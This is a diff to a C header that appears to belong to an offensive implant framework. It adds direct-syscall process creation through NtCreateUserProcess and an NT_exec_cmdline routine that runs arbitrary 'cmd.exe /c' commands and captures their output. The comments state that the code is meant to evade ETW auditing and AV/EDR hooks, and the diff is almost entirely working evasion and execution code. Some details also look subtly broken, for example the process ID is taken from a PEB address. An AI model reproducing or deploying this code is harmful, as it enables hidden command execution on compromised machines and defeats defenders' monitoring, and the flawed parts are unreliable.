@@ -662,6 +662,353 @@ static HANDLE Gate_OpenProcess(DWORD dwDesiredAccess, DWORD dwProcessId) {
     return hProcess;
 }
 
+/* ────────────────────────────────────────────────────────────────────
+ * NtCreateUserProcess — direct syscall process creation
+ *
+ * This replaces CreateProcessA/W entirely, sidestepping:
+ *   - kernel32!CreateProcess ETW (Microsoft-Windows-Security-Auditing)
+ *   - Win32 API hooks set by AV/EDR on CreateProcessInternalW
+ *   - PsSetCreateProcessNotifyRoutineEx callbacks that fire for Win32
+ *     layer calls (some EDRs only hook the Win32 path)
+ *
+ * Reference: ReactOS / Process Hacker / Ionic Wind source
+ * ─────────────────────────────────────────────────────────────────── */
+
+/* UNICODE_STRING — needed for process params */
+typedef struct _GATE_UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} GATE_UNICODE_STRING;
+
+/* RTL_USER_PROCESS_PARAMETERS — opaque but layout-compatible */
+typedef struct _GATE_RTL_USER_PROCESS_PARAMETERS {
+    BYTE Reserved1[16];
+    PVOID Reserved2[10];
+    GATE_UNICODE_STRING ImagePathName;
+    GATE_UNICODE_STRING CommandLine;
+} GATE_RTL_USER_PROCESS_PARAMETERS;
+
+/* PS_ATTRIBUTE — one entry in the attribute list */
+typedef struct _GATE_PS_ATTRIBUTE {
+    ULONG_PTR Attribute;
+    SIZE_T    Size;
+    union {
+        ULONG_PTR Value;
+        PVOID     ValuePtr;
+    };
+    PSIZE_T   ReturnLength;
+} GATE_PS_ATTRIBUTE;
+
+typedef struct _GATE_PS_ATTRIBUTE_LIST {
+    SIZE_T             TotalLength;
+    GATE_PS_ATTRIBUTE  Attributes[2];
+} GATE_PS_ATTRIBUTE_LIST;
+
+/* PS_CREATE_INFO — process creation state block */
+typedef enum _GATE_PS_CREATE_STATE {
+    PsCreateInitialState,
+    PsCreateFailOnFileOpen,
+    PsCreateFailOnSectionCreate,
+    PsCreateFailExeFormat,
+    PsCreateFailMachineMismatch,
+    PsCreateFailExeName,
+    PsCreateSuccess,
+    PsCreateMaximumStates
+} GATE_PS_CREATE_STATE;
+
+typedef struct _GATE_PS_CREATE_INFO {
+    SIZE_T             Size;
+    GATE_PS_CREATE_STATE State;
+    union {
+        /* PsCreateInitialState */
+        struct {
+            union {
+                ULONG InitFlags;
+                struct {
+                    UCHAR  WriteOutputOnExit  : 1;
+                    UCHAR  DetectManifest     : 1;
+                    UCHAR  IFEOSkipDebugger   : 1;
+                    UCHAR  IFEODoNotPropagateKeyState : 1;
+                    UCHAR  SpareBits1         : 4;
+                    UCHAR  SpareBits2         : 8;
+                    USHORT ProhibitedImageCharacteristics;
+                };
+            };
+            ACCESS_MASK AdditionalFileAccess;
+        } InitState;
+        /* PsCreateSuccess */
+        struct {
+            union {
+                ULONG OutputFlags;
+                struct {
+                    UCHAR ProtectedProcess      : 1;
+                    UCHAR AddressSpaceOverride  : 1;
+                    UCHAR DevOverrideEnabled    : 1;
+                    UCHAR ManifestDetected      : 1;
+                    UCHAR ProtectedProcessLight : 1;
+                    UCHAR SpareBits3            : 3;
+                    UCHAR SpareBits4            : 8;
+                    USHORT SpareBits5;
+                };
+            };
+            HANDLE FileHandle;
+            HANDLE SectionHandle;
+            ULONGLONG UserProcessParametersNative;
+            ULONG    UserProcessParametersWow64;
+            ULONG    CurrentParameterFlags;
+            ULONGLONG PebAddressNative;
+            ULONG    PebAddressWow64;
+            ULONGLONG ManifestAddress;
+            ULONG    ManifestSize;
+        } SuccessState;
+    };
+} GATE_PS_CREATE_INFO;
+
+/* PsAttribute numbers (PROCESS_CREATION_ATTRIBUTE_*) */
+#define GATE_PS_ATTRIBUTE_IMAGE_NAME  0x00020005UL
+#define GATE_PS_ATTRIBUTE_CLIENT_ID   0x00010003UL
+#define GATE_PS_ATTRIBUTE_STD_HANDLE  0x00060007UL
+
+/* NtCreateUserProcess typedef */
+typedef NTSTATUS (WINAPI *pfn_NtCreateUserProcess)(
+    PHANDLE               ProcessHandle,
+    PHANDLE               ThreadHandle,
+    ACCESS_MASK           ProcessDesiredAccess,
+    ACCESS_MASK           ThreadDesiredAccess,
+    PVOID                 ProcessObjectAttributes,   /* OBJECT_ATTRIBUTES* */
+    PVOID                 ThreadObjectAttributes,    /* OBJECT_ATTRIBUTES* */
+    ULONG                 ProcessFlags,
+    ULONG                 ThreadFlags,
+    PVOID                 ProcessParameters,         /* RTL_USER_PROCESS_PARAMETERS* */
+    GATE_PS_CREATE_INFO  *CreateInfo,
+    GATE_PS_ATTRIBUTE_LIST *AttributeList
+);
+
+static NTSTATUS Gate_NtCreateUserProcess(
+    PHANDLE               ProcessHandle,
+    PHANDLE               ThreadHandle,
+    ACCESS_MASK           ProcessDesiredAccess,
+    ACCESS_MASK           ThreadDesiredAccess,
+    PVOID                 ProcessObjectAttributes,
+    PVOID                 ThreadObjectAttributes,
+    ULONG                 ProcessFlags,
+    ULONG                 ThreadFlags,
+    PVOID                 ProcessParameters,
+    GATE_PS_CREATE_INFO  *CreateInfo,
+    GATE_PS_ATTRIBUTE_LIST *AttributeList)
+{
+    pfn_NtCreateUserProcess fn;
+    WORD ssn = gate_get_ssn("NtCreateUserProcess");
+    if (ssn == 0xFFFF || !g_syscall_addr) {
+        fn = (pfn_NtCreateUserProcess)
+             GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateUserProcess");
+        if (fn) return fn(ProcessHandle, ThreadHandle,
+                          ProcessDesiredAccess, ThreadDesiredAccess,
+                          ProcessObjectAttributes, ThreadObjectAttributes,
+                          ProcessFlags, ThreadFlags,
+                          ProcessParameters, CreateInfo, AttributeList);
+        return (NTSTATUS)0xC0000001L;
+    }
+    fn = (pfn_NtCreateUserProcess)g_syscall_addr;
+    GATE_SET_SSN(ssn);
+    return fn(ProcessHandle, ThreadHandle,
+              ProcessDesiredAccess, ThreadDesiredAccess,
+              ProcessObjectAttributes, ThreadObjectAttributes,
+              ProcessFlags, ThreadFlags,
+              ProcessParameters, CreateInfo, AttributeList);
+}
+
+/* ── RtlCreateProcessParametersEx helper ────────────────────────────
+ *
+ * RtlCreateProcessParametersEx is an Rtl* function (not a syscall),
+ * so we call it via GetProcAddress from the in-memory ntdll.  It
+ * builds the RTL_USER_PROCESS_PARAMETERS block required by
+ * NtCreateUserProcess and handles all ImagePath / CommandLine path
+ * normalisation internally.
+ * ─────────────────────────────────────────────────────────────────── */
+
+/* RTL_USER_PROC_PARAMS_NORMALIZED -- not in MinGW SDK, define it ourselves.
+ * Value 1 tells Rtl* to convert relative offsets to absolute pointers. */
+#ifndef RTL_USER_PROC_PARAMS_NORMALIZED
+#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001UL
+#endif
+
+typedef NTSTATUS (WINAPI *pfn_RtlCreateProcessParametersEx)(
+    PVOID       *pProcessParameters,
+    GATE_UNICODE_STRING *ImagePathName,
+    GATE_UNICODE_STRING *DllPath,
+    GATE_UNICODE_STRING *CurrentDirectory,
+    GATE_UNICODE_STRING *CommandLine,
+    PVOID        Environment,
+    GATE_UNICODE_STRING *WindowTitle,
+    GATE_UNICODE_STRING *DesktopInfo,
+    GATE_UNICODE_STRING *ShellInfo,
+    GATE_UNICODE_STRING *RuntimeData,
+    ULONG        Flags);
+
+typedef NTSTATUS (WINAPI *pfn_RtlDestroyProcessParameters)(PVOID pProcessParameters);
+
+/* Convert ASCII to GATE_UNICODE_STRING (caller frees buf) */
+static GATE_UNICODE_STRING gate_str_from_ascii(const char *src) {
+    GATE_UNICODE_STRING us;
+    size_t len = strlen(src);
+    PWSTR buf = (PWSTR)HeapAlloc(GetProcessHeap(), 0, (len + 1) * sizeof(WCHAR));
+    if (!buf) { memset(&us, 0, sizeof(us)); return us; }
+    for (size_t i = 0; i <= len; i++) buf[i] = (WCHAR)(unsigned char)src[i];
+    us.Buffer        = buf;
+    us.Length        = (USHORT)(len * sizeof(WCHAR));
+    us.MaximumLength = (USHORT)((len + 1) * sizeof(WCHAR));
+    return us;
+}
+
+static void gate_free_ustr(GATE_UNICODE_STRING *us) {
+    if (us && us->Buffer) {
+        HeapFree(GetProcessHeap(), 0, us->Buffer);
+        us->Buffer = NULL;
+    }
+}
+
+/*
+ * NT_exec_cmdline — create a child process via NtCreateUserProcess
+ *
+ *   cmdline  : narrow-character command line ("cmd.exe /c whoami")
+ *   hStdOut  : write end of a pipe for child stdout/stderr capture
+ *   hStdErr  : same handle (or separate)
+ *   pi       : receives process/thread handles
+ *
+ * Returns NTSTATUS; NT_SUCCESS(status) on success.
+ *
+ * NOTE: We launch "cmd.exe" unconditionally, passing cmdline as-is.
+ *       The image path is resolved to %SystemRoot%\System32\cmd.exe.
+ */
+static NTSTATUS NT_exec_cmdline(
+    const char       *cmdline,
+    HANDLE            hStdOut,
+    HANDLE            hStdErr,
+    PROCESS_INFORMATION *pi)
+{
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return (NTSTATUS)0xC0000001L;
+
+    pfn_RtlCreateProcessParametersEx fnCreate =
+        (pfn_RtlCreateProcessParametersEx)
+        GetProcAddress(ntdll, "RtlCreateProcessParametersEx");
+    pfn_RtlDestroyProcessParameters fnDestroy =
+        (pfn_RtlDestroyProcessParameters)
+        GetProcAddress(ntdll, "RtlDestroyProcessParameters");
+    if (!fnCreate) return (NTSTATUS)0xC0000001L;
+
+    /* Build full cmd.exe path */
+    char sysdir[MAX_PATH];
+    GetSystemDirectoryA(sysdir, sizeof(sysdir));
+    char imgpath[MAX_PATH];
+    snprintf(imgpath, sizeof(imgpath), "\\??\\%s\\cmd.exe", sysdir);
+
+    /* Build command line: "cmd.exe /c <cmdline>" */
+    char cmdline_full[4096 + 64];
+    snprintf(cmdline_full, sizeof(cmdline_full), "cmd.exe /c %s", cmdline);
+
+    GATE_UNICODE_STRING usImagePath = gate_str_from_ascii(imgpath);
+    GATE_UNICODE_STRING usCmdLine   = gate_str_from_ascii(cmdline_full);
+    if (!usImagePath.Buffer || !usCmdLine.Buffer) {
+        gate_free_ustr(&usImagePath);
+        gate_free_ustr(&usCmdLine);
+        return (NTSTATUS)0xC0000017L; /* STATUS_NO_MEMORY */
+    }
+
+    /* Desktop/window title strings */
+    GATE_UNICODE_STRING usDesktop = gate_str_from_ascii("Winsta0\\Default");
+    GATE_UNICODE_STRING usTitle   = gate_str_from_ascii("");
+
+    /* Create process parameters */
+    PVOID procParams = NULL;
+    NTSTATUS st = fnCreate(
+        &procParams,
+        &usImagePath,
+        NULL,
+        NULL,
+        &usCmdLine,
+        NULL,
+        &usTitle,
+        &usDesktop,
+        NULL,
+        NULL,
+        RTL_USER_PROC_PARAMS_NORMALIZED);
+    gate_free_ustr(&usImagePath);
+    gate_free_ustr(&usCmdLine);
+    gate_free_ustr(&usDesktop);
+    gate_free_ustr(&usTitle);
+    if (!NT_SUCCESS(st)) return st;
+
+    /* Inherit stdout/stderr redirects via std handle attribute */
+    typedef struct {
+        ULONG Flags;
+        HANDLE StdInput;
+        HANDLE StdOutput;
+        HANDLE StdError;
+    } GATE_STD_HANDLE_INFO;
+
+    GATE_STD_HANDLE_INFO stdHandles;
+    memset(&stdHandles, 0, sizeof(stdHandles));
+    stdHandles.Flags     = 0x00000007; /* HANDLE_FLAG_INHERIT all three */
+    stdHandles.StdInput  = GetStdHandle(STD_INPUT_HANDLE);
+    stdHandles.StdOutput = hStdOut;
+    stdHandles.StdError  = hStdErr;
+
+    /* Attribute list: [0] ImageName (required), [1] StdHandleInfo */
+    GATE_PS_ATTRIBUTE_LIST attrList;
+    memset(&attrList, 0, sizeof(attrList));
+    attrList.TotalLength = sizeof(GATE_PS_ATTRIBUTE_LIST);
+
+    attrList.Attributes[0].Attribute  = GATE_PS_ATTRIBUTE_IMAGE_NAME;
+    attrList.Attributes[0].Size       = usImagePath.Length;
+    attrList.Attributes[0].ValuePtr   = procParams; /* RTL params embed the image name */
+
+    /* Use the image path re-extracted from procParams */
+    GATE_RTL_USER_PROCESS_PARAMETERS *pp =
+        (GATE_RTL_USER_PROCESS_PARAMETERS*)procParams;
+    attrList.Attributes[0].Size       = pp->ImagePathName.Length;
+    attrList.Attributes[0].ValuePtr   = pp->ImagePathName.Buffer;
+
+    attrList.Attributes[1].Attribute  = GATE_PS_ATTRIBUTE_STD_HANDLE;
+    attrList.Attributes[1].Size       = sizeof(stdHandles);
+    attrList.Attributes[1].ValuePtr   = &stdHandles;
+
+    /* PS_CREATE_INFO */
+    GATE_PS_CREATE_INFO createInfo;
+    memset(&createInfo, 0, sizeof(createInfo));
+    createInfo.Size  = sizeof(createInfo);
+    createInfo.State = PsCreateInitialState;
+    createInfo.InitState.InitFlags = 0;
+    createInfo.InitState.AdditionalFileAccess = 0;
+
+    /* Create the process */
+    HANDLE hProcess = NULL, hThread = NULL;
+    st = Gate_NtCreateUserProcess(
+        &hProcess,
+        &hThread,
+        PROCESS_ALL_ACCESS,
+        THREAD_ALL_ACCESS,
+        NULL,
+        NULL,
+        0,    /* ProcessFlags   — 0 = normal */
+        0,    /* ThreadFlags    — 0 = start suspended is 1; 0 = run immediately */
+        procParams,
+        &createInfo,
+        &attrList);
+
+    if (fnDestroy) fnDestroy(procParams);
+
+    if (NT_SUCCESS(st)) {
+        pi->hProcess = hProcess;
+        pi->hThread  = hThread;
+        pi->dwProcessId = (DWORD)(ULONG_PTR)createInfo.SuccessState.PebAddressNative;
+        pi->dwThreadId  = 0;
+    }
+    return st;
+}
+
 #pragma GCC diagnostic pop
 
 #endif /* APEX_SYSCALL_H */
